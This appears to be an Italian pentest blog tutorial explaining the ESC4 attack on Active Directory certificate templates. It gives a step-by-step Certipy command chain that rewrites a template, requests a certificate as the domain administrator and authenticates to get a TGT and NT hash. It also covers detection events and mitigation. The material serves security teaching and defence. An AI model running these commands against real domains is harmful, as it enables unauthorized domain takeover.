---
title: 'ESC4 ADCS Privilege Escalation: Template Hijacking con Certipy'
slug: esc4-adcs
description: 'ESC4 ADCS Privilege Escalation: sfruttare ACL deboli sui certificate template Active Directory per trasformarli in ESC1 e ottenere Domain Admin con Certipy.'
image: /BCO.9ce6ba52-ce57-472f-b167-52ab8931a51e.webp
draft: true
date: 2026-03-07T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - esc
  - certipy
---

ESC4 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** basata sull'abuso delle **ACL dei certificate template**.

Se un attaccante possiede permessi di scrittura su un template Active Directory (WriteDACL, WriteOwner, GenericAll o simili), può modificarne completamente la configurazione e **trasformarlo in un template vulnerabile a ESC1**.

In questa guida vediamo **come sfruttare ESC4 ADCS con Certipy passo dopo passo**, modificando un template sicuro, ottenendo un certificato come **Administrator** e autenticandosi tramite **Kerberos PKINIT**.

## Quando ESC4 ADCS È Sfruttabile

* L'attaccante ha **permessi di scrittura** sull'oggetto template AD: WriteDACL, WriteOwner, WriteProperty, GenericAll, o FullControl
* Gruppi ampi come Authenticated Users o Domain Users hanno uno di questi permessi (Certipy lo segnala automaticamente)

***

## Exploit ESC4 ADCS Con Certipy

### Step 1 — Enumera i template con ACL deboli

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
```

### Step 2 — Sovrascrivi il template (salva backup automatico)

```bash
certipy template -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -template 'SecureFiles' -write-default-configuration
```

Questo comando: abilita EnrolleeSuppliesSubject, aggiunge EKU Client Authentication, concede enrollment ad Authenticated Users, disabilita manager approval, imposta authorized signatures a 0. La configurazione originale viene salvata in `SecureFiles.json`.

### Step 3 — Sfrutta come ESC1

```bash
certipy req -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -target CA.CORP.LOCAL -ca 'CORP-CA' -template 'SecureFiles' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```

### Step 4 — Autenticati

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip 10.0.0.100
```

### Step 5 — Ripristina il template originale

```bash
certipy template -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -template 'SecureFiles' -write-configuration 'SecureFiles.json' -no-save
```

Il ripristino è fondamentale per ridurre l'impatto durante un pentest.

***

## Output Dell'Attacco ESC4

* Template sicuro → convertito a ESC1
* **TGT + NT hash** come Administrator
* Il template originale può essere ripristinato dal file JSON di backup

***

## Detection ESC4 ADCS

* **Event ID 4899** — template aggiornato
* **Event ID 4900** — permessi di sicurezza del template modificati
* **Event ID 5136** — modifica oggetto directory service (cambio attributi template)

***

## Mitigation ESC4 ADCS

* Audita le ACL su tutti gli oggetti template: solo Enterprise Admins e Domain Admins devono avere permessi di scrittura
* Rimuovi permessi WriteDACL/WriteOwner/GenericAll da gruppi ampi
* Monitora le modifiche ai template con gli Event ID sopra indicati

***

## FAQ — ESC4 ADCS

### Cos'è ESC4 in ADCS?

ESC4 è l'abuso delle ACL deboli sugli oggetti template in Active Directory. Se un utente può scrivere su un template, può trasformarlo in un template vulnerabile a ESC1 e richiedere certificati come Domain Admin.

### Come sfruttare ESC4 con Certipy?

Un comando `certipy template -write-default-configuration` riscrive il template rendendolo vulnerabile a ESC1. Poi si sfrutta normalmente con `certipy req -upn administrator@corp.local`.

### Qual è la differenza tra ESC4 e ESC1?

[ESC1](https://hackita.it/articoli/esc1-adcs) sfrutta un template già vulnerabile. ESC4 crea la vulnerabilità modificando le ACL di un template sicuro. Il risultato finale è identico.

### ESC4 è rilevabile?

Sì. Le modifiche ai template generano Event ID specifici (4899, 4900, 5136). È una delle tecniche ADCS più rumorose.

***

**Key Takeaway:** Se hai permessi di scrittura su un template, puoi trasformarlo in ESC1 con un singolo comando Certipy — e ripristinarlo dopo.

> ESC4 dimostra come **ACL deboli sui certificate template** possano trasformare un template sicuro in un vettore di privilege escalation. Per la panoramica completa degli attacchi certificate-based leggi la guida: [ADCS ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16).\
> Continua con le tecniche successive: [ESC5 ADCS](https://hackita.it/articoli/esc5-adcs) · [ESC6 ADCS](https://hackita.it/articoli/esc6-adcs).Se questo contenuto ti è utile puoi **supportare HackIta** su [Supporta](https://hackita.it/supporto).\
> Vuoi imparare **pentesting Active Directory e offensive security 1:1** oppure **testare la sicurezza del tuo sito o della tua infrastruttura aziendale**? Vai su [Servizi HackIta](https://hackita.it/servizi).Riferimenti tecnici:\
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)\
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)\
> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
